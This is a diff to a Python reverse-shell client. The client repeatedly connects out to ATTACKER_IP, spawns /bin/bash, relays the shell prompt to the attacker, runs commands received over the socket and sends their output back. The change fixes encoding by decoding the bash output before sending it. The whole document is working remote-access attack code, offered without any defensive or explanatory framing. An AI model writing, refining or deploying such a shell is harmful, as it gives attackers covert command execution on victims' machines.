@@ -13,13 +13,14 @@ def main():
     while client_socket.connect(ATTACKER_IP, PORT_NUMBER) != 0:
         sleep(SLEEP_TIME)
 
-    child_shell = pexpect.spawn('/bin/bash', encoding='utf-8')
+    child_shell = pexpect.spawn('/bin/bash', encoding=None)
     child_shell.expect(TARGET_SHELL_PROMPT_REGEX_LIST)
 
     # receive and process user commands and return output
     while True:
         # get the shell prompt and send it to the attacker
         prompt = child_shell.after
+        prompt = prompt.decode('utf-8', 'backslashreplace')
         client_socket.send(prompt)
 
         # wait for the attacker to send a command and then run it
@@ -30,6 +31,7 @@ def main():
 
         # send the output of the command back to the attacker
         command_output = child_shell.before # also includes actual command but could get rid of?
+        command_output = command_output.decode('utf-8', 'backslashreplace')
         client_socket.send(command_output)
 
 
